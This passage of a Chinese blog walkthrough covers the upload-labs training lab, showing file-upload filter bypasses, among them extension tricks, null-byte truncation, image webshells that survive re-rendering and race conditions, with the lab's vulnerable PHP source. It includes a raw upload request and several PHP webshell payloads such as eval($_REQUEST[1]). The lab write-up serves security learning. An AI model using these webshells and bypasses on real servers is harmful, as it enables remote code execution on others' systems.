class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-05/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>upload-labs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>311</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://upload-labs</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryB0UdjI6DB38pICSw</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://upload-labs/Pass-05/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>上传之后需要稍微等几分钟,等待user.ini生效</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220152813484.png" alt="image-20240220152813484"></p><p>这里就成功了</p><h2 id="Pass-06-末尾添加空格绕过"><a href="#Pass-06-末尾添加空格绕过" class="headerlink" title="Pass-06(末尾添加空格绕过)"></a>Pass-06(末尾添加空格绕过)</h2><p>这关需要在windows下进行, 对应了对应 buu upload-labs windows中的Pass-07</p><p>与之前对比这里少了首尾去除空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>需要注意的是在linux平台下能上传.php(空格)但是不能解析</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220144032092.png" alt="image-20240220144032092"></p><p>而在window下上传.php(空格)后,系统会自动删掉末尾的空格</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220160008012.png" alt="image-20240220160008012"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220160035462.png" alt="image-20240220160035462"></p><h2 id="Pass-07-末尾添加-绕过"><a href="#Pass-07-末尾添加-绕过" class="headerlink" title="Pass-07(末尾添加.绕过)"></a>Pass-07(末尾添加.绕过)</h2><p>没有删除末尾的点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220154319631.png" alt="image-20240220154319631"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220154354916.png" alt="image-20240220154354916"></p><h2 id="Pass-08-末尾添加-DATA绕过"><a href="#Pass-08-末尾添加-DATA绕过" class="headerlink" title="Pass-08(末尾添加::$DATA绕过)"></a>Pass-08(末尾添加::$DATA绕过)</h2><p>缺少了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><blockquote><p>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</p><p>例如:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</p></blockquote><p>这关仍是需要在windows下进行,<strong>对应 buu upload-labs windows中的Pass-09</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220155606882.png" alt="image-20240220155606882"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220155548411.png" alt="image-20240220155548411"></p><h2 id="Pass-09-末尾添加"><a href="#Pass-09-末尾添加" class="headerlink" title="Pass-09(末尾添加. .)"></a>Pass-09(末尾添加. .)</h2><p>虽然删除了末尾的点,但是只会删除一次,只需要构造.php. .即可</p><p><img src="C:/Users/hcj/AppData/Roaming/Typora/typora-user-images/image-20240220161304719.png" alt="image-20240220161304719"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161250250.png" alt="image-20240220161250250"></p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10(双写绕过)"></a>Pass-10(双写绕过)</h2><p>此关做了一个检测到黑字符并删除一次,只需要构造一个双写即可</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161639031.png" alt="image-20240220161639031"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161708635.png" alt="image-20240220161708635"></p><h2 id="Pass-11-00截断-get"><a href="#Pass-11-00截断-get" class="headerlink" title="Pass-11(%00截断 get)"></a>Pass-11(%00截断 get)</h2><p>此pass在本地测试,所以为全部21关的pass-12</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>可以看见这里上传路径可控, 只需要将上传路径构造成php文件名然后%00截断后面的数据即可</p><blockquote><p>php版本&lt;&#x3D; 5.3.4</p><p>需要设置php的magic_quotes_gpc为OFF状态。</p><p>否则php会将00截断字符进行转义</p></blockquote><p>比较无语的都是这些条件都弄好后还是不行,下一关也是这样 php版本5.3.29nts</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220171518503.png" alt="image-20240220171518503"></p><h2 id="Pass-12-00截断-post"><a href="#Pass-12-00截断-post" class="headerlink" title="Pass-12(%00截断 post)"></a>Pass-12(%00截断 post)</h2><p>此pass在本地测试,所以为全部21关的pass-13</p><p>与上一关不同的是采用post发送路径, %00不会被自动解码,所以要再hex中更改</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220172214262.png" alt="image-20240220172214262"></p><p>将这里的2b改为00即可</p><p>这里也没有成功,但方法是这个方法</p><h2 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13(图片马绕过)"></a>Pass-13(图片马绕过)</h2><p>这一关对文件头信息做了检测,并根据文件头对文件后缀名重写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再真的png图片末尾加上php构造图片马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220172823309.png" alt="image-20240220172823309"></p><p>之后利用其他漏洞如文件包含来解析图片马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220173250962.png" alt="image-20240220173250962"></p><h2 id="Pass-14-图片马绕过"><a href="#Pass-14-图片马绕过" class="headerlink" title="Pass-14(图片马绕过)"></a>Pass-14(图片马绕过)</h2><p>源码不一样,但还是相同的配方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220174448027.png" alt="image-20240220174448027"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220174459794.png" alt="image-20240220174459794"></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>Pass-13,14解法相同</p><h2 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16(二次渲染)"></a>Pass-16(二次渲染)</h2><p>这里参考一篇大佬的博客:</p><p><a href="https://www.sqlsec.com/2020/10/upload.html#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">https://www.sqlsec.com/2020/10/upload.html#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93</a></p><p>这里虽然是第16关, 但在全部21关里是第17关也就是二次渲染</p><h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF:"></a>GIF:</h3><p>随便找一张gif图片</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/2.gif" alt="2"></p><p>上传后,将返回的图片下载下来</p><p>在010editor的tools中的compare模块比较两张图片,并找到两张图片相同的部分(Match的灰色部分, 或者点击match后,蓝色的部分)</p><p>之后插入木马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240221194217773.png" alt="image-20240221194217773"></p><p>这里插入在<code>.......</code>处成功率高一点, 试过几次插在别的地方可能会不成功</p><p>保存后重新上传,包含渲染后的图片</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240221194322951.png" alt="image-20240221194322951"></p><h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG:"></a>PNG:</h3><p>直接使用github中的已有的项目</p><p><a href="https://github.com/hxer/imagecreatefrom-/tree/master/png/poc">https://github.com/hxer/imagecreatefrom-/tree/master/png/poc</a></p><p>可以使用它给出的poc图片或者自己生成一个,这里直接使用给出的poc</p><p>注意 自己生成的话需要python2环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222145218462.png" alt="image-20240222145218462"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222145208117.png" alt="image-20240222145208117"></p><h3 id="JPG"><a href="#JPG" class="headerlink" title="JPG:"></a>JPG:</h3><p>同意在github找到现成的项目</p><p><a href="https://github.com/BlackFan/jpg_payload">https://github.com/BlackFan/jpg_payload</a></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222154943666.png" alt="image-20240222154943666"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222155327830.png" alt="image-20240222155327830"></p><p>试了很多次都是这样</p><p>换了一张比较大的图片,上面的问题没了但是插入后的payload并不完整</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222160105600.png" alt="image-20240222160105600"></p><p>这里补充: 插入后看不见<code>_</code>并不是<code>_</code>消失了, 在010editor能看见<code>_</code>是存在的</p><p>最后用大佬的这个payload是可以成功插入的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222160433105.png" alt="image-20240222160433105"></p><p>但是还会出现提示不是jpg</p><p>这里其实phpinfo插入进去是可以成功的, 别的payload要么回显不是jpg, 要么插入进去后<code>_</code>被删掉了</p><p>最后尝试了无数遍后成功插入进去了<code>&lt;?php @eval($_POST[a]);?&gt;</code>,并且再次渲染后payload依然存在,但是在include后并不能解析,不知道什么问题</p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17(条件竞争)"></a>Pass-17(条件竞争)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见这里是先把文件保存下来再进行判断, 因此可以进行条件竞争</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222181755245.png" alt="image-20240222181755245"></p><p><img src="C:/Users/hcj/AppData/Roaming/Typora/typora-user-images/image-20240222181811015.png" alt="image-20240222181811015"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222181820037.png" alt="image-20240222181820037"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这里不能再使用php文件了, 因为服务器会比对后缀名后再决定是否保存,</p><p>这里直接上传图片马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223153402676.png" alt="image-20240223153402676"></p><p>可以用用文件包含来条件竞争我们上传的图片马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223153322537.png" alt="image-20240223153322537"></p><h2 id="Pass-19-move-uploaded-file-特性"><a href="#Pass-19-move-uploaded-file-特性" class="headerlink" title="Pass-19(move_uploaded_file()特性)"></a>Pass-19(move_uploaded_file()特性)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span 